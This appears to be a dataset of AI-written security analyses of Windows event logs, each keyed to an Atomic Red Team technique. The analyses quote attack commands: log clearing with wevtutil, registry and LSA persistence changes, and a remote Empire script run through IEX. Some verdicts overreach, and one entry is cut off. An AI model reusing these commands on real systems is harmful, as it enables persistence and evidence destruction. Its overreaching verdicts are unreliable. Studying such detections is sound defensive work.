   - Event ID 1102 in the Security log indicates that logs have been cleared by the user ""admin_test"". Clearing logs can signify an attempt to hide malicious activities.
   - The Sysmon log contains evidence of `wevtutil.exe` being used to clear multiple logs (`Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, and `Security`) by the same user.

3. **Unusual Process Executions:**
   - The use of `wevtutil.exe` and PowerShell activities by ""admin_test"" without a clear benign purpose, combined with the fact that these activities coincide with log clearing operations, is suspicious.

4. **Time Change Event:**
   - There is a time adjustment in the system (Event ID 4616 and related entries in the Kerne-General log), which might be benign, but when correlated with other events, might indicate an attempt to manipulate system time for evasion purposes or to align with the execution of malicious scripts.

### Assessment:

Given the manipulation of the service binary path to execute a non-standard executable (which could be part of a persistence mechanism), coupled with the clearing of logs which is often indicative of an obfuscation attempt, the activities recorded can strongly indicate malicious activity. 

### Resolution:
- **MALICIOUS**: The combination of PowerShell script execution to alter normal system operation, clearing of multiple logs, and unusual system activities constitute clear signs of likely compromised behavior.

### Recommendations:

1. **Immediate Review and Response:**
   - Conduct a thorough investigation of the server ""Server002"" and especially the ""admin_test"" user activities.
   - Isolate the server to prevent further potential compromise or lateral movement within the network.

2. **Remediation Steps:**
   - Restore the original binary paths for any services impacted (such as the ""fax"" service).
   - Audit user accounts for unusual permissions and consider credential resets for impacted accounts.
   - Review and enhance monitoring rules to detect similar PowerShell activities and log clearance attempts.

3. **Strengthen Security Posture:**
   - Implement stricter PowerShell execution policies and utilize Just Enough Administration (JEA) to limit administrative actions.
   - Strengthen log management to detect and alert on log clearance and other suspicious activities immediately.

4. **Forensic Analysis:**
   - Conduct a forensic analysis of the system and obtain memory dumps to check for any malware presence.
   - Check for backdoors or additional scripts that may have been left for persistence."
Import XML Schedule Task with Hidden Attribute,"Based on the Windows event logs provided, a thorough analysis highlights several activities that warrant further investigation. Here's a breakdown of the findings:

1. **Log Cleared Events**:
    - Multiple logs indicate that event logs were cleared, evident from EventID 1102 in the Security log and EventID 104 in the System log. The clearing of logs is often a strong indicator of malicious activity as it can suggest an attempt to remove traces or evidence of unauthorized activities. The logs were cleared by a user with the username ""admin_test"".

2. **PowerShell Activity**:
    - A PowerShell script was executed that reads an XML file and registers a scheduled task using `Invoke-CimMethod`. The XML file is located in what appears to be a temporary directory used by the Atomic Red Team's testing scripts (e.g., T1053.005).
    - Such activity could be benign if the Atomic Red Team script execution is known and sanctioned by the organization for testing or training purposes. However, this must be verified, as this same pattern could be indicative of an attacker attempting to establish persistence on the system through scheduled tasks.

3. **Sysmon Events for Process Execution**:
    - The logs show the execution of `wevtutil.exe` to clear multiple logs, including Security, Application, and System logs. This behavior aligns with attempts to cover tracks post-compromise.
    - The frequent execution of PowerShell and other command-line tools warrants attention, particularly around the same timestamps as the log-clearing events, which could corroborate a coordinated malicious campaign.
    - Process executions such as `whoami.exe` and `hostname.exe` are relatively benign and are part of information gathering that could be legitimate or preparatory reconnaissance depending on context. 

4. **Suspicious File Paths and Tools**:
    - The XML file path associated with PowerShell script execution being in a temp folder suggests a transient operation that may not align with normal operations.
    - The presence of the Atomic Red Team toolset raises questions about authorized red team activities versus the potential misuse by a threat actor.

**Assessment**:
The identified actions, particularly the log-clearing events combined with PowerShell execution related to scheduled tasks, are concerning. They suggest potential nefarious activity aimed at persisting and erasing evidence on the host.

**Resolution**: SUSPICIOUS

**Guidance on How to Proceed**:
- **Immediate Actions**: Confirm whether the Atomic Red Team activities were legitimately scheduled and documented within your organization. If not, treat this as potentially malicious.
- **Further Investigation**: Review any additional security logs, alerts, or IDS/IPS and SIEM notifications for correlating indicators of compromise on ""Server002"". 
- **Endpoint Analysis**: Conduct a forensic investigation of ""Server002"" focusing on file integrity, unauthorized changes, and other compromise indicators.
- **User Verification**: Validate the authenticity of ""admin_test"" and investigate any anomalous account behaviors or unauthorized access attempts.

The coordinated nature of log clearing and PowerShell execution strongly suggests potential malicious activity, even if a benign explanation may exist."
Shortcut Modification,"Upon reviewing the provided Windows event logs, several events stand out as potentially suspicious or indicative of malicious activity. Here is a summary of the analysis:

1. **Log File Clearing:**
   - **Security Log (Event ID 1102):** The security logs have been cleared by the user `admin_test` on `Server002`. Clearing of logs, especially security logs, can be a significant indicator of malicious intent as threat actors may attempt to cover their tracks.
   - **System Log (Event ID 104):** There are also multiple system logs cleared around the same time by the same user `admin_test`. This further supports suspicious activity, indicating an attempt to hide actions performed on the system.

2. **Time Changes:**
   - **Security Log (Event ID 4616):** There is evidence of the system time being set backwards, which can be a technique used to evade detection mechanisms or possibly to manipulate timestamps for covering tracks in log files.

3. **Process Execution Patterns:**
   - **Sysmon Logs:**
     - Multiple executions of `wevtutil.exe` to clear logs (`Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Security` channels) by the same `admin_test` user.
     - Usage of `whoami.exe` and `hostname.exe`. While these tools are legitimate, their use, combined with the above actions, could suggest reconnaissance or enumeration by an adversary.
     - A notably suspicious command line involving `cmd.exe` to create and execute a shortcut file pointing to `calc.exe`. This behavior indicates a potential script or malicious activity aiming to persist or execute unwanted processes.

Considering the above points, the provided set of logs indicates potentially suspicious activity. The log clearing, time manipulation, and indicative commands like the shortcut creation are particularly concerning. However, without additional context or corroboration from other sources (such as antivirus logs or network activity), it may not be definitive to label it as 100% malicious.

### Assessment: **SUSPICIOUS**
- **Threats/Risks Identified:** Possible indication of malicious activity aiming to cover tracks and conduct reconnaissance.
- **Guidance on How to Proceed:**
  1. Conduct a thorough review of user `admin_test` activities.
  2. Check for additional security controls such as EDR logs for further evidence.
  3. Monitor the system for further log clearing attempts or unusual activity.
  4. Consider conducting a full threat assessment on `Server002` to identify potential malicious implants or scripts.
  5. Ensure proper backups are available and potentially consider restoring to a known safe state.

This assessment calls for deeper investigation to determine the full extent of any malicious activity and to ensure the security of the system."
`SeDebugPrivilege` token duplication,"During the analysis of the event logs, several factors have stood out that warrant a deeper investigation into potential malicious activity. Here's a breakdown of the findings:

### Anomalous Activities:

1. **Event Log Clearing:**
   - There is evidence of logs being cleared. This is captured in the Security log EventID 1102 (""Log file cleared"") and System log EventID 104 (""Channel cleared"" for System and Windows PowerShell) executed by the `admin_test` user. This is a significant red flag as attackers often clear logs to cover their tracks.

2. **Time Change Events:**
   - There are entries in the Security log EventID 4616 indicating a change in the system time (`PreviousTime` and `NewTime`) conducted by the `LOCAL SERVICE`. Time manipulation can be used to align actions or tamper evidence within logs, although the context here shows both changes were executed instantaneously to match correct times usually caused by adjustments from a time service in normal operation.

3. **Suspicious PowerShell Command:**
   - The Sysmon log entries indicate the execution of PowerShell with a potentially malicious script. The command line involved downloading and executing a script from a known penetration testing framework, Empire, associated with privilege escalation (`https://raw.githubusercontent.com/BC-SECURITY/Empire/.../Get-System.ps1`). This is directly linked to post-exploitation scenarios indicative of attempted privilege escalation.
   - PowerShell logs corroborate the execution of the script from Empire which is typically used for malicious intents.

4. **Usage of System Utilities:**
   - The logs show the `wevtutil.exe` utility being used to clear logs. This tool is a command-line utility allowing manipulation of event logs, which aligns with the log clearing activities noticed. This pattern of using system binaries for malicious purposes is known as living-off-the-land (LotL) tactic.

### Assessment:

The detailed analysis of these logs leads to the following conclusions:

- The combined activities of event log clearing, time manipulation, and suspicious PowerShell script execution strongly suggest malicious intent rather than benign administrative work.
- The presence of these actions during a narrow time frame indicates a coordinated effort likely by an attacker.

### Resolution:

Given these findings, the resolution for the investigation is:

**MALICIOUS**

### Recommended Actions:

1. **Immediate Containment:**
   - Isolate the affected machine (Server002) to prevent further spread of potential malicious activity.
   
2. **Thorough Host Review:**
   - Conduct a full disk and memory analysis of the affected host to uncover the extent of compromise and identify any additional malicious payloads.
   
3. **Log Review and Recovery:**
   - Review any backups of logs that might reveal more context before the logs were cleared. Restore these as much as possible for continuity and investigation.

4. **Enhance Monitoring:**
   - Implement stricter monitoring for the use of utilities like `wevtutil.exe`, and unexpected PowerShell usage.
   
5. **User Activity Verification:**
   - Verify `admin_test` account activities to ensure it has not been compromised and appropriately secure or deactivate the account if necessary.

6. **Security Software Audit:**
   - Ensure that all endpoint security solutions (like antivirus and anti-malware software) are updated and operational to prevent recurrence.

These steps will not only help address the current incident but will also fortify defenses against future threats."
Process Hollowing in Go using CreateProcessW WinAPI,"### Analysis of the Logs:

#### System Log Analysis:
1. **Event ID 104 (Log File Cleared)**:
   - Two events indicate that the logs for the ""System"" and ""Windows PowerShell"" channels were cleared by `admin_test`. Clearing event logs can indicate an attempt to hide malicious activity.

#### Sysmon Log Analysis:
1. **Event ID 1 and 5 (Process Creation and Termination)**:
   - There are multiple instances of `wevtutil.exe` used predominantly for clearing event logs (`cl`). It was executed by `admin_test` which aligns with the log clearing observed in the system logs.
   - The suspicious command line execution of `PowerShell` includes reference to `AtomicRedTeam`, a collection of scripted Windows attack simulations, particularly in conjunction with `CreateProcess.exe`. This suggests simulation or execution of specific attack behaviors, implying a potential adversarial simulation test rather than benign user activity.

#### Windows PowerShell Log Analysis:
1. **Event ID 600 (Provider State Change)**:
   - The PowerShell logs show the launching of a console host with the command line involving `CreateProcess.exe` from `AtomicRedTeam`. This correlates with the Sysmon logs indicating suspicious or simulated attack-like behavior.

#### Security Log Analysis:
1. **Event ID 1102 (Audit Log Cleared)**:
   - Security logs were cleared by `admin_test`. Clearing security logs is a known tactic to hide illicit activities.

#### Anomalies and Indicators of Compromise:
- **Log Clearing**: The consistent clearing of System, Security, and Windows PowerShell event logs is highly suspicious and typically indicative of someone trying to cover their tracks.
- **Atomic Red Team Execution**: The presence and execution of `AtomicRedTeam` scripts suggest either a security test or potential malicious reconnaissance or attack simulation.
- **Use of `wevtutil.exe`**: This utility's use for clearing logs further supports the narrative of a potential cover-up or simulation test.

### Conclusion:
- **Resolution: SUSPICIOUS**

The activities documented in these logs demonstrate behavior that doesn't align with typical benign operations, especially the clearing of multiple event logs and the execution of tools associated with cybersecurity testing frameworks like `AtomicRedTeam`. While it's possible this could be part of a legitimate penetration test, it certainly warrants further investigation to verify the intent and authorization of these actions.

### Guidance:
1. **Verify Authorization**: Confirm if there was an authorized penetration test or red team exercise scheduled.
2. **Identify `admin_test` Activity**: Investigate the actions and access of the user `admin_test`.
3. **Review Related Systems**: Check for any unusual network activity or other indicators across associated systems during the same timeframe.
4. **Endpoint Security Review**: Confirm that anti-virus or endpoint detection capabilities are not disabled or compromised.
5. **Log Retention Policies**: Ensure that logs are saved to secure locations where they cannot be easily tampered with by end-users."
Winlogon HKLM Shell Key Persistence - PowerShell,"### Detailed Analysis

#### Summary of Findings

Upon reviewing the provided Windows event logs from Server002 across various systems such as Application, System, Windows PowerShell, Sysmon, and Security logs, several indicators of potentially malicious activity are identified. This assessment focuses on anomalous and suspicious behaviors that stand out from regular operations:

#### Suspicious Behavior Identified:

1. **Clearing Event Logs:**
   - **System Log:** The events show that `admin_test` cleared multiple logs (System, Windows PowerShell, Security).
     - Event ID 104 in the System Log indicates logs were cleared by `admin_test`.
     - Event ID 1102 in the Security Log indicates the Security log was also cleared.

2. **Unsanctioned PowerShell Activity:**
   - The PowerShell logs indicate a suspicious use of `Set-ItemProperty` to manipulate the `HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell` registry key. This action tries to alter the shell startup with an additional command to execute `cmd.exe`.
   - This type of modification is usually employed to gain persistence or run unauthorized command interfaces.

3. **Use of `wevtutil` Utility:**
   - Multiple Sysmon events show the `wevtutil.exe` command line being executed with commands tailored to clear event logs (CommandLine: `""C:\Windows\system32\wevtutil.exe"" cl Application`).
   - This behavior is consistent with attempts to destroy evidence of system activity.

4. **Integrity Level and User Activity:**
   - The activities are carried out under a high integrity level, indicating that the actions are being executed with elevated privileges. This is suspicious because such operations typically require administrative permissions.

5. **(Process Graph and Misuse of Legitimate Services:**
   - Several processes like `CONHOST.EXE` and `wevtutil.exe` are associated in a hierarchy where their creation is suspect due to the timing and the context.
   - Execution of `whoami.exe` and `HOSTNAME.EXE` tracks and considers the execution potentially legitimate but in conjunction with other suspicious activities; they might signify reconnaissance.

6. **Time Synchronization Adjustments:**
   - Changes in system time are logged, potentially indicating attempts to manipulate timestamps to obfuscate further investigative tracking.

### Assessment

The above observations strongly suggest that the logs contain indicators of malicious activity. The identified patterns of behavior, such as clearing of logs, suspicious PowerShell command execution, and registry manipulation, are significant indicators of compromise in Windows environments.

### Resolution

- **MALICIOUS**: The logs contain clear indicators of malicious behavior. The execution of suspicious PowerShell commands, manipulation of critical system registry keys, and actions to clear event logs strongly signal unauthorized and malicious activity.

### Recommendations

1. **Immediate Containment:**
   - Isolate the server (Server002) from the network to prevent further malicious actions or data exfiltration.

2. **Detailed Forensic Investigation:**
   - Conduct a full forensic review of the system, including memory analysis, timelines reconstruction, and more in-depth examination to determine the scope of the breach.

3. **Password Changes and Security Enhancements:**
   - Immediately change passwords for all accounts with access to the affected server, particularly for the `admin_test` account.
   - Review and enhance security policies regarding admin privileges and monitor critical accounts.

4. **Restore from Known Good Backup:**
   - Once forensic analysis and system cleaning are complete, restore the system from a backup known to be free of compromise before the observed activity.

5. **Monitor and Harden further:**
   - Implement and heighten intrusion detection mechanisms and monitor for any recurring suspicious activities across similar systems."
Reg Key Run,"In reviewing the provided Windows event logs, several indicators of potentially suspicious activity have been identified. Below is a detailed analysis of the logs that stand out for possible malicious activity:

1. **Log File Clearing:**
   - **System Log Cleared:** The entries with EventID 104 indicate that the system log and the Windows PowerShell log were both cleared by the user `admin_test`. This is often considered suspicious as attackers may clear logs to cover their tracks after executing malicious actions.

2. **Security Log Cleared:**
   - **Security Log Clearance:** Security EventID 1102 confirms that the security log was also cleared by the same user, `admin_test`. This action occurring along with the System and PowerShell logs being cleared increases suspicion since such actions are typically aimed at deleting evidence of potential security breaches or unauthorized activity.

3. **Unusual Registry Modification:**
   - **Atomic Red Team Execution:** The Sysmon log entry (ProcessID 4628) shows a `cmd.exe` process executing a registry add command to `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` with the value ""Atomic Red Team"". This action suggests an attempt to establish persistence on the system by ensuring a program runs at startup. Tools like Atomic Red Team are often used for penetration testing, which can signify a simulated attack or real compromise.

4. **Time Change Event:**
   - **System Time Changed:** Security events 4616 indicate changes to the system time. While such events are sometimes benign, when correlated with cleared logs, they can be a tactic used alongside other actions to manipulate timestamps and further obfuscate activities.

5. **Process Execution Entries:**
   - **Processes Related to Wevtutil and Hosts:** Multiple Sysmon entries show execution of `wevtutil.exe` with parameters clearing log files and other processes like `conhost.exe`, `cmd.exe`, `reg.exe`, `hostnames.exe` tracing back to `admin_test`. This includes launching a `whoami` command potentially to determine the current user context.

Based on the above analysis and the pattern of actions typically associated with attempts to cover tracks after potentially malicious activity, the evidence suggests that the behavior captured in the logs is more than just casual or accidental clearing of logs. Instead, it aligns with tactics used by adversaries for stealth and persistence.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- Immediately check the integrity and activities of the user account `admin_test`.
- Investigate external access logs and other endpoints to determine if further compromise has occurred.
- Review and restrict user permissions, especially for accounts with administrative privileges.
- Conduct a more thorough forensic investigation to ascertain the full scope of the compromise.
- Restore cleared logs, if possible, from backup sources to review for earlier signs of suspicious activity.
- Consider implementing enhanced monitoring and alerting for log clearance activities and unauthorized registry changes."
HKLM - re-execute Internet Explorer Core Fonts' StubPath payload by decreasing version number,"Upon analyzing the logs provided, here are the observations and findings:

### Suspicious Activities:

1. **Log Clearing Events:**
   - There are multiple log clearing events within a very short time frame. Specifically:
     - Security log cleared by `admin_test` (Event ID 1102).
     - System log cleared by `admin_test` (Event ID 104).
     - Windows PowerShell log cleared by `admin_test` (Event ID 104).
   - Log clearing without appropriate administrative tasks or agreements can be suspicious, as it might indicate an attempt to cover tracks.

2. **Time Manipulation:**
   - There are events indicating changes to the system time:
     - `svchost.exe` was involved in adjusting system time backward (Event ID 4616 in Security log and Kernel-General events in System log).
   - Unauthorized time changes can result in obfuscation of event timelines and is often utilized by attackers to evade detection.

3. **Unusual PowerShell Activity:**
   - A PowerShell command was executed that modified the registry and involved running `runonce.exe`. This is noted in the Windows PowerShell log:
     - The command modifies `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components` to set a version value to `""0,0,0,0""`, which is atypical:
     - PowerShell Command: `powershell.exe & {Set-ItemProperty -Path ""HKCU:\SOFTWARE\Microsoft\Active Setup\Installed Components\{C9E9A340-D1F1-11D0-821E-444553540600}"" -Name ""Version"" -Value ""0,0,0,0"", & $env:SYSTEMROOT\system32\runonce.exe /AlternateShellStartup}`
   - While this action could be benign if tied to official administrative tasks, it is commonly seen in malicious scripts.

4. **Sysmon Events:**
   - Multiple instances of `wevtutil.exe cl` being executed to clear event logs. Legitimate administrators rarely need to clear logs frequently unless for log maintenance or similar approved tasks.

5. **Windows Event Clearing:**
   - The use of `wevtutil.exe` for clearing logs is corroborated by both the Sysmon and Security logs and executed by the user `SERVER002\admin_test`.

### Assessment and Resolution:

Based on the detailed log analysis, the activity observed aligns with tactics used in malicious activities, specifically indicators of attempting to cover tracks (via log clearing and time manipulation) and potential unauthorized system changes using PowerShell scripts:

- **Resolution: MALICIOUS**

### Recommended Actions:

1. **Immediate Investigation and Forensics:**
   - Perform a deeper forensic analysis of the system to understand the extent of potential compromise and to recover any cleared logs if possible.

2. **Containment:**
   - Consider isolating the affected system from the network to prevent further potential lateral movement by an attacker.

3. **Review User Account Activity:**
   - Investigate the `admin_test` account activity for authenticity and legitimacy. Reset credentials and further secure the account if necessary.

4. **Implement Monitoring Enhancements:**
   - Establish tighter monitoring of log-clearing activities and unauthorized time changes on critical systems.

5. **Review Security Measures:**
   - Conduct a comprehensive review of access privileges and implement least privilege practices. Ensure security patches and antivirus signatures are up to date.

These actions can help secure the system, prevent further malicious actions, and provide a basis for recovery efforts."
Authentication Package,"Upon analyzing the event logs provided, I identified several activities that raise serious concerns and suggest malicious behavior:

### Indicators of Malicious Activity:

1. **Clearing of Event Logs**:
   - There are multiple entries (Event ID 104 in the System log) indicating that logs (System, Windows PowerShell, and Security) on ""Server002"" were cleared by the user ""admin_test"". This is generally a concerning activity as it is often associated with an attempt to cover tracks of malicious activities.

2. **Suspicious PowerShell Execution**:
   - The PowerShell log shows instances of PowerShell being executed with the command: `powershell.exe & {Copy-Item ""C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1547.002\bin\package.dll"" C:\Windows\System32\`, along with a registry modification intended to add a suspicious authentication package. Such activity suggests a potential attempt to install a persistent backdoor or a malicious DLL injection technique (APTs often use such methods to maintain persistence).

3. **Registry Modification via PowerShell**:
   - As shown in the Windows PowerShell log, there was a registry modification executed to add ""package.dll"" to `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa`, which is a critical registry location that can modify authentication processes and could potentially be used for malicious purposes.

4. **Privilege Escalation/Account Misuse**:
   - The ""admin_test"" account is associated with activities that have elevated privileges such as clearing logs and executing the aforementioned PowerShell commands. This could suggest either misuse of the account or compromise.

5. **Sysmon Activity**:
   - Sysmon logs show processes associated with suspicious actions, specifically ""wevtutil.exe,"" which is used to clear logs, executed under ""admin_test."" Furthermore, the ""whoami.exe"" and querying of the system host using ""hostname.exe"" shortly after the PowerShell activity, suggest reconnaissance or verification steps after alteration.

### Risk Assessment:
- **Threat**: The activities suggest that there is a high likelihood of system compromise and persistence through malicious means.
- **Risk**: Unauthorized access to sensitive areas of the system, data exfiltration, or further spreading of malware within the network.

### Guidance on How to Proceed:
- **Immediate Containment**: Disable the ""admin_test"" account and any other potentially compromised accounts. Isolate the affected system, ensuring it is disconnected from the network to prevent further spread or damage.
- **Investigation**: Conduct a full forensic analysis of the affected system, including potential malware presence, unauthorized changes to system files, or any suspicious network activities.
- **Recovery and Remediation**: Clean the system from any identified malicious software, restore from known good backups, and change credentials for privileged accounts.
- **Logging and Monitoring**: Reinstate and enhance logging capabilities across the environment to detect similar activities more swiftly in the future.

### Resolution:
- **MALICIOUS**: The logs contain indicators of malicious activity with an attempt at persistence establishment via registry modification with a potentially malicious DLL and log clearing to cover tracks."
LockBit Black - Modify Group policy settings -Powershell,"Upon analysis of the provided Windows event logs, several key observations raise concerns indicating potential malicious activity:

1. **Log Clearing Activities**:
   - The logs reveal multiple instances of log clearing, performed by the user `admin_test`, who appears to have administrative privileges. Notably, Sysmon event logs and PowerShell logs were cleared, which is often an attempt by malicious actors to cover their tracks.

2. **Suspicious PowerShell Activity**:
   - The execution of PowerShell commands that modify registry keys, particularly within `HKLM:\SOFTWARE\Policies\Microsoft\Windows\System`, indicates potential malicious behavior. The command-line arguments to change Group Policy refresh times and SmartScreen settings could be indicative of tampering with security settings.

3. **Use of Windows System Utilities**:
   - The `wevtutil.exe` was used to clear event logs. It’s a known technique used by adversaries to erase evidence of their activities. Furthermore, the chain of `conhost.exe` processes following `wevtutil.exe` could suggest an attempt to obfuscate actions.

4. **High-Integrity Level Execution**:
   - Multiple processes executed under a high integrity level, which typically indicates privileged execution capabilities, further suggests the misuse of administrative credentials.

5. **Temporal and Correlation Analysis**:
   - The timing of events (log clearing) and PowerShell execution closely align, reinforcing the hypothesis that a deliberate attempt was made to disrupt normal security monitoring and harden post-compromise operations.

Given the combination of these events, especially the registry changes via PowerShell, the clearing of logs (Sysmon, Security, Windows PowerShell), and the presence of suspicious process execution vectors, it is clear that these logs exhibit patterns associated with an intrusion or compromise.

**Assessment and Resolution: MALICIOUS**

**Guidance on How to Proceed**:
- Initiate an immediate incident response protocol to contain and assess the scope of the breach.
- Conduct memory captures and forensic analysis of Server002 to detect any further malicious artifacts.
- Verify the integrity of critical system configurations and Group Policy objects.
- Implement enhanced monitoring, particularly around PowerShell activity and log clearance activities.
- Reset credentials for `admin_test` and review the account’s recent activities. Consider auditing administrative access policies.
- Review and strengthen logging retention policies to avoid unauthorized access and clearance in future scenarios.

This analysis identifies a likely significant security incident that merits urgent attention and remediation actions."
Azure AD Application Hijacking - App Registration,"Upon analyzing the provided Windows event logs, I've identified several indicators and activities that raise concerns about potential malicious activity:

1. **Security Events (EventID 1102) - Log Clearing**: 
   - There is a security event indicating that logs for the System and Security channels were cleared by the user ""SERVER002\admin_test"". This is suspicious behavior when not part of routine maintenance, as attackers often clear logs to erase traces of their activity.

2. **Sysmon Events - PowerShell Activity**:
   - Multiple Sysmon logs indicate execution of PowerShell processes with potentially suspicious command lines (e.g., PowerShell script importing AzureAD module and setting up credentials, creating certificates).
   - PowerShell is a powerful tool often used by administrators but is also frequently abused by attackers for post-compromise actions. The nature of the commands being executed in the provided logs, especially involving AzureAD and certificate handling, can signal attack tactics related to credential theft, application hijacking, or backdoor setup.

3. **PowerShell Logs**:
   - The PowerShell logs reflect the execution of scripts that manage AzureAD applications, certificates, and credential objects, which could indicate unauthorized access attempts or the setting of a potentially malicious persistence mechanism.

4. **Event Correlation**:
   - There are several PowerShell events and processes stemming from the user ""SERVER002\admin_test"" that demonstrate potential lateral movement or privilege escalation attempts.

5. **Security Privileges (EventID 4672)**:
   - Privileged rights were assigned to the SYSTEM account, including high-impact privileges like `SeDebugPrivilege`, often sought by attackers to bypass security mechanisms.

Given the combination of these factors, the activities recorded in these logs stand out as potentially malicious. The clearing of event logs and the execution of PowerShell scripts involving AzureAD raise red flags that warrant a deeper investigation.

**Final Assessment**: MALICIOUS

**Guidance for Proceeding**:
- **Immediate Actions**: Isolate the affected system to prevent further potential compromise within the network.
- **Thorough Investigation**: Conduct a detailed forensic analysis to trace the origins and full scope of the PowerShell activity, examining potentially affected credentials and AzureAD setups.

- **Security Awareness**: Alert the IT and security teams to the observed behaviors and promote vigilance against similar tactics in the network.
"
Add Federation to Azure AD,"### Analysis of Logs

The provided event logs show a series of activities across various system components. Here's a breakdown of the logs and the analysis of any potential malicious activity:

---

### Sysmon Log

1. **Console Window Host (`conhost.exe`) Spawned by Eventing Command Line Utility (`wevtutil.exe`)**:
   - Multiple entries show `conhost.exe` being spawned by `wevtutil.exe`. This behavior is normal as `conhost.exe` is used to host console windows and often accompanies command-line utilities like `wevtutil.exe`.

2. **`wevtutil.exe` Command Execution**: 
   - The repeated use of the command `wevtutil.exe cl <channel>` indicates that various event logs (System, Application, Security, and Windows PowerShell) are being cleared.
   - This action is noteworthy because log clearing can indicate an attempt to cover tracks after malicious activity.

3. **Windows PowerShell Activity**:
   - Execution of a PowerShell script with modules `AzureAD` and `AADInternals`, and use of commands like `Connect-AzureAD` and `ConvertTo-AADIntBackdoor`. The script attempts to manage Azure AD domains, create tokens, and backdoors.
   - This type of PowerShell activity is highly suspicious and indicative of malicious intent, specifically if the script successfully creates a backdoor for persistent access.

4. **Instances of Windows Management Host (`wsmprovhost.exe`)**:
   - Multiple instances appearing as the parent process of several commands, which is typical for command execution via a remote management session.

---

### System Log

1. **Event Log Clearing (`EventID 104`)**:
   - There are entries showing the clearing of the System and Windows PowerShell logs by a user `admin_test`. Log clearing is a strong indicator of malicious activity aiming to remove traces of other activities.

---

### Windows PowerShell Log

1. **Execution of Suspicious PowerShell Scripts**:
   - Detailed PowerShell activity logs corresponding with the Sysmon logs. The use of the `AADInternals` module and scripts designed to manage Azure AD configurations in a suspicious manner reaffirms potential malicious actions.

---

### Security Log

1. **Audit Log Clearing (`EventID 1102`)**:
   - The Security log records were cleared by `admin_test`. This further corroborates suspicious activity, as attackers often clear logs to hide malicious actions.

---

### Application Log

- The Application log appears incomplete or devoid of significant entries, which aligns with logs being cleared.

---

### Conclusion and Recommendations

The analysis indicates:

- **Indicators of Malicious Activity**: The use of `wevtutil.exe` to clear logs (`cl`) and the execution of a PowerShell script involving AzureAD manipulation and backdoor actions suggest malicious intent.
- **Attempted Cover-up**: The clearing of event logs (System, Security, PowerShell) by the same user further suggests actions attempting to remove traces.

**Resolution: MALICIOUS**

### Guidance

- **Immediate Actions**:
  1. **Isolate the Host**: Disconnect `Server002` from the network to prevent further compromise.
  2. **Investigate Credentials**: Assess whether `admin_test` credentials have been leaked or misused.

Shellcode execution via VBA,"### Detailed Analysis

Upon reviewing the provided logs, the following observations can be made:

1. **Process Execution Chain**:
   - Multiple instances of `wevtutil.exe` are observed, which is a legitimate utility used for exporting, archiving, and clearing event logs. However, its frequent usage, especially for clearing logs, can be indicative of malicious activity trying to erase tracks.
   - `PowerShell.exe` is also observed executing commands from unauthorized sources. The executed script is downloaded from a URL under control of an entity (`raw.githubusercontent.com/redcanaryco/atomic-red-team`), suggesting a possible execution of a suspicious or potentially harmful script.

2. **PowerShell Activity**:
   - The `PowerShell` logs indicate execution of a script from an external URL, a common tactic used by attackers to download and execute malicious code. The specific command referenced in the `PowerShell` logs (**`Invoke-Maldoc`**) can denote a simulated attack from the Atomic Red Team framework, often used for testing security defenses by simulating attacks.
   - The command-line arguments and the use of `IEX` (Invoke-Expression) to execute the downloaded script increases the risk factor, as it might allow for the execution of unauthorized scripts.

3. **Log Clearing Events**:
   - Several logs in different channels (System, Security, and Windows PowerShell) have been cleared by `admin_test`, as indicated by event ID `1102` in the Security log and event ID `104` in System and Application logs. Clearing logs deliberately can be indicative of an attempt to hide malicious activities.

### Assessment

The observed activities align with tactics typically associated with malicious intent, particularly:

- **Log Manipulation**: Clearing logs in the System, Security, and PowerShell channels.
- **Execution of Suspicious Scripts**: Usage of PowerShell to download and execute a script from an external location.
  
Both are strong indicators that suggest the system might have been compromised or is currently under attack.

### Recommendations

1. **Immediate Response**:
   - If not already isolated, isolate the host from the network to prevent potential spread or data exfiltration.
   - Perform a forensic analysis to verify the integrity of the system and ensure it is securely cleaned.

2. **Further Investigation**:
   - Investigate the `admin_test` account activities and verify if it is compromised, especially focusing on any privilege escalation or lateral movement.
   - Determine the intent and effect of the executed scripts from the PowerShell log by referencing the scripts indicated.

3. **Enhancements**:
   - Implement strict group policy settings to limit execution policies for PowerShell and logging to detect unusual PowerShell activities.
   - Enhance monitoring and alerting capabilities to detect and respond to script execution and log manipulation activities.

### Resolution: **MALICIOUS**

The logs provide clear evidence of activities (log clearing and script execution from external sources) that align with typical malicious behavior, indicating a potential compromise. Immediate action and a thorough investigation are required to address and remediate the apparent potential threat."
Process Injection via C#,"**Detailed Analysis:**

Upon reviewing the provided logs, a sequence of events indicates potential malicious activity:

1. **Utilization of Wevtutil for Log Clearing:**
   - The `wevtutil.exe` command line utility was used multiple times with the `cl` (clear log) argument on critical logs like ""Microsoft-Windows-Sysmon/Operational"", ""Application"", ""System"", ""Security"", and ""Windows PowerShell"". This action is often taken by adversaries to cover their tracks after malicious activity.
   - Example log entry:
     ```json
     {
       ""ProcessId"": ""6132"",
       ""Image"": ""C:\\Windows\\System32\\wevtutil.exe"",
       ""CommandLine"": ""\""C:\\Windows\\system32\\wevtutil.exe\"" cl System"",
       ""User"": ""SERVER002\\admin_test""
     }
     ```

2. **Execution of Suspicious Commands:**
   - There is a suspicious execution of `cmd.exe` with a command line argument invoking a binary from the `AtomicRedTeam` directory (`T1055.exe`). This indicates a likely simulation or testing of known attack techniques.
   - The process lineage shows `cmd.exe` was executed from a high-integrity level, further compounding the risk.
   - Example log entry:
     ```json
     {
       ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
       ""CommandLine"": ""\""cmd.exe\"" /c \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1055.004\\bin\\T1055.exe\"""",
       ""User"": ""SERVER002\\admin_test""
     }
     ```

3. **Time Tampering:**
   - The system time was altered multiple times, which is another tactic used to evade detection by manipulating the timestamps of incident activities.
   - Example log entry:
     ```json
     {
       ""PreviousTime"": ""2024-10-22 18:16:12.1088799"",
       ""NewTime"": ""2024-10-22 18:15:43.4382865""
     }
     ```

4. **Execution of Common Reconnaissance Commands:**
   - Utilities like `whoami.exe` and `hostname.exe` were executed, which are commonly used to gather information about the system and user context during the initial stages of an attack.

**Assessment:**
